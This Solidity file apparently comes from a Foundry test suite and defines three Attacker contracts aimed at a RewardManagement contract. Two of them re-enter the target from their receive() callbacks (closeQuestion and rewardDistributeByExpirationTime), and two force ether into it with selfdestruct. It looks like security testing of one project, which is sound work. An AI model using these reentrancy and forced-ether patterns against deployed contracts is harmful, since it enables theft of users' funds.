// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

import {RewardManagement} from "../src/RewardManagement.sol";
import {console2} from "forge-std/Test.sol";
contract Attacker {
    RewardManagement public reward; 
    constructor(RewardManagement _reward){
        reward = _reward; 
    }
    uint256 counter = 0;
    function selfD() public payable{
        selfdestruct(payable(address(reward))); 
    }

    receive() external payable{
        counter++; 
        if (counter <= 1){
            reward.closeQuestion(1, false);
        }
    }
}

contract Attacker2 {
    RewardManagement public reward; 
    constructor(RewardManagement _reward){
        reward = _reward; 
    }

    uint256 counter = 0;

    receive() external payable{
        counter++; 
        if (counter <= 1){
            reward.rewardDistributeByExpirationTime(1);
        }
        //assertEq(address(this).balance, 10 ether);
    }
}

contract Attacker3{
    RewardManagement public reward; 
    constructor(RewardManagement _reward){
        reward = _reward; 
    }

    function selfD() public payable{
        selfdestruct(payable(address(reward))); 
    }
}